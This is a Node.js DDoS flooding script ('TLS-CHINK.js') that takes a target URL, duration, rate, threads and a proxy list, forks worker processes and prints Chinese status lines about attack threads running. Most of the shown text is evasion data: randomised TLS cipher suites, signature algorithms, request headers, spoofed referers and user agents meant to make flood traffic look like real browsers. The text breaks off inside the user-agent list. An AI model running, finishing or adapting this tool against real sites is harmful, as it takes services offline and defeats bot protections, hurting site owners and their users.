const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require("user-agents");
const fs = require("fs");
const { HeaderGenerator } = require("header-generator");
const axios = require("axios");
const https = require("https");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (exception) {});

if (process.argv.length < 7) {
  console.log(
    `命令：\nnode TLS-CHINK.js <url> <time> <rate> <threads> <proxyfile>`,
  );
  process.exit();
}
const headers = {};
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, "0");
  const minutes = now.getMinutes().toString().padStart(2, "0");
  const seconds = now.getSeconds().toString().padStart(2, "0");
  return `(${hours}:${minutes}:${seconds})`;
};

const targetURL = process.argv[2];
const agent = new https.Agent({ rejectUnauthorized: false });

function getStatus() {
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error("dalboeb"));
    }, 5000);
  });

  const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
      console.log(`信息：${getCurrentTime()} 标题：${getTitleFromHTML(data)}`);
    })
    .catch((error) => {
      if (error.message === "sosi penis") {
        console.log(`信息：${getCurrentTime()} 请求超时`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(
          `信息：${getCurrentTime()} 标题：${extractedTitle} {error.response.status}`,
        );
      } else {
        console.log(`信息：${getCurrentTime()} ${error.message}`);
      }
    });
}

function getTitleFromHTML(html) {
  const titleRegex = /<title>(.*?)<\/title>/i;
  const match = html.match(titleRegex);
  if (match && match[1]) {
    return match[1];
  }
  return "Not Found";
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

function randomString(length) {
  var result = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6],
};

if (cluster.isMaster) {
  console.clear();
  console.log(`信息: ${getCurrentTime()}`);
  console.log(`------------------------------------------`);
  console.log(`目标：` + process.argv[2]);
  console.log(`时间：` + process.argv[3]);
  console.log(`速率：` + process.argv[4]);
  console.log(`线程：` + process.argv[5]);
  console.log(`List：` + process.argv[5]);
  console.log(`------------------------------------------`);
  for (let i = 1; i <= process.argv[5]; i++) {
    cluster.fork();
    console.log(`信息：${getCurrentTime()} 攻击线程 ${i} 已启动`);
  }
  console.log(`信息：${getCurrentTime()} 攻击运行中`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`信息：${getCurrentTime()} 攻击已结束`);
    process.exit(1);
  }, process.argv[3] * 1000);
}

let headerGenerator = new HeaderGenerator({
  browsers: [
    { name: "firefox", minVersion: 112, httpVersion: "2" },
    { name: "opera", minVersion: 112, httpVersion: "2" },
    { name: "edge", minVersion: 112, httpVersion: "2" },
    { name: "chrome", minVersion: 112, httpVersion: "2" },
    { name: "safari", minVersion: 16, httpVersion: "2" },
  ],
  devices: ["desktop", "mobile"],
  operatingSystems: ["windows", "linux", "macos", "android", "ios"],
  locales: ["en-US", "en"],
});
let randomHeaders = headerGenerator.getHeaders();

const cplist = [
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-SHA256",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-ECDSA-AES256-SHA384",
  "ECDHE-RSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-SHA",
  "ECDHE-RSA-AES128-SHA",
  "AES128-GCM-SHA256",
  "AES256-GCM-SHA384",
  "AES128-SHA256",
  "AES256-SHA256",
  "AES128-SHA",
  "AES256-SHA",
  "DHE-RSA-AES128-SHA256",
  "DHE-RSA-AES256-SHA256",
  "DHE-RSA-AES128-SHA",
  "DHE-RSA-AES256-SHA",
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS13-AES128-GCM-SHA256",
  "TLS13-AES256-GCM-SHA384",
  "AES256-GCM-SHA384",
  "AES128-GCM-SHA256",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-ECDSA-AES128-SHA256",
];

const hihi = ["require-corp", "unsafe-none"];

const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "rsa_pss_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_sha384",
  "rsa_pkcs1_sha384",
  "rsa_pss_sha512",
  "rsa_pkcs1_sha512",
  "ed25519",
  "ed448",
  "sm2sig_sm3",
  "ecdsa_secp521r1_sha512",
];
lang_header = [
  "en-US, en;q=0.9",
  "es-ES, es;q=0.9, en;q=0.8",
  "zh-CN, zh;q=0.9, en;q=0.8",
  "hi-IN, hi;q=0.9, en;q=0.8",
  "ar-SA, ar;q=0.9, en;q=0.8",
  "pt-BR, pt;q=0.9, en;q=0.8",
  "ru-RU, ru;q=0.9, en;q=0.8",
  "ja-JP, ja;q=0.9, en;q=0.8",
  "de-DE, de;q=0.9, en;q=0.8",
  "fr-FR, fr;q=0.9, en;q=0.8",
  "it-IT, it;q=0.9, en;q=0.8",
  "ko-KR, ko;q=0.9, en;q=0.8",
  "vi-VN, vi;q=0.9, en;q=0.8",
  "tr-TR, tr;q=0.9, en;q=0.8",
  "nl-NL, nl;q=0.9, en;q=0.8",
  "pl-PL, pl;q=0.9, en;q=0.8",
  "fa-IR, fa;q=0.9, en;q=0.8",
  "th-TH, th;q=0.9, en;q=0.8",
  "sv-SE, sv;q=0.9, en;q=0.8",
  "cs-CZ, cs;q=0.9, en;q=0.8",
  "ro-RO, ro;q=0.9, en;q=0.8",
  "hu-HU, hu;q=0.9, en;q=0.8",
  "sr-RS, sr;q=0.9, en;q=0.8",
  "uk-UA, uk;q=0.9, en;q=0.8",
  "el-GR, el;q=0.9, en;q=0.8",
  "fi-FI, fi;q=0.9, en;q=0.8",
  "he-IL, he;q=0.9, en;q=0.8",
  "id-ID, id;q=0.9, en;q=0.8",
  "ms-MY, ms;q=0.9, en;q=0.8",
  "da-DK, da;q=0.9, en;q=0.8",
  "no-NO, no;q=0.9, en;q=0.8",
  "sk-SK, sk;q=0.9, en;q=0.8",
  "af-ZA, af;q=0.9, en;q=0.8",
  "sw-KE, sw;q=0.9, en;q=0.8",
  "et-EE, et;q=0.9, en;q=0.8",
];

accept_header = [
  "application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
  "text/html; charset=utf-8",
  "application/json, text/plain, */*",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
];

(encoding_header = [
  "gzip, deflate, br",
  "compress, gzip",
  "deflate, gzip",
  "gzip, identity",
  "*",
]),
  (controle_header = [
    "no-cache",
    "no-store",
    "no-transform",
    "only-if-cached",
    "max-age=0",
    "must-revalidate",
    "public",
    "private",
    "proxy-revalidate",
    "s-maxage=86400",
  ]),
  (encoding_header = [
    "*",
    "*/*",
    "gzip",
    "gzip, deflate, br",
    "compress, gzip",
    "deflate, gzip",
    "gzip, identity",
    "gzip, deflate",
    "br",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip;q=1.0, identity; q=0.5, *;q=0",
    "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25",
    "compress;q=0.5, gzip;q=1.0",
    "identity",
    "gzip, compress",
    "compress, deflate",
    "compress",
    "gzip, deflate, br",
    "deflate",
  ]);

controle_header = [
  "max-age=604800",
  "proxy-revalidate",
  "public, max-age=0",
  "max-age=315360000",
  "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800",
  "s-maxage=604800",
  "max-stale",
  "public, immutable, max-age=31536000",
  "must-revalidate",
  "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
  "max-age=31536000,public,immutable",
  "max-age=31536000,public",
  "min-fresh",
  "private",
  "public",
  "s-maxage",
  "no-cache",
  "no-cache, no-transform",
  "max-age=2592000",
  "no-store",
  "no-transform",
  "max-age=31557600",
  "stale-if-error",
  "only-if-cached",
  "max-age=0",
  "must-understand, no-store",
  "max-age=31536000; includeSubDomains",
  "max-age=31536000; includeSubDomains; preload",
  "max-age=120",
  "max-age=0,no-cache,no-store,must-revalidate",
  "public, max-age=604800, immutable",
  "max-age=0, must-revalidate, private",
  "max-age=0, private, must-revalidate",
  "max-age=604800, stale-while-revalidate=86400",
  "max-stale=3600",
  "public, max-age=2678400",
  "min-fresh=600",
  "public, max-age=30672000",
  "max-age=31536000, immutable",
  "max-age=604800, stale-if-error=86400",
  "public, max-age=604800",
  "no-cache, no-store,private, max-age=0, must-revalidate",
  "o-cache, no-store, must-revalidate, pre-check=0, post-check=0",
  "public, s-maxage=600, max-age=60",
  "public, max-age=31536000",
  "max-age=14400, public",
  "max-age=14400",
  "max-age=600, private",
  "public, s-maxage=600, max-age=60",
  "no-store, no-cache, must-revalidate",
  "no-cache, no-store,private, s-maxage=604800, must-revalidate",
];

const Methods = [
  "GET",
  "HEAD",
  "POST",
  "PUT",
  "DELETE",
  "CONNECT",
  "OPTIONS",
  "TRACE",
  "PATCH",
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

const queryStrings = ["&", "="];

const pathts = [
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment",
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
];

const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/search?q=",
  "https://www.google.com/translate?u=",
  "https://www.reddit.com/search?q=",
  "https://www.search.com/search?q=",
  "https://www.shodanhq.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://www.google.com/",
  "https://duckduckgo.com/?q=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://www.google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=",
  "https://www.npmjs.com/search?q=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
];

var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(":");

const uap = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
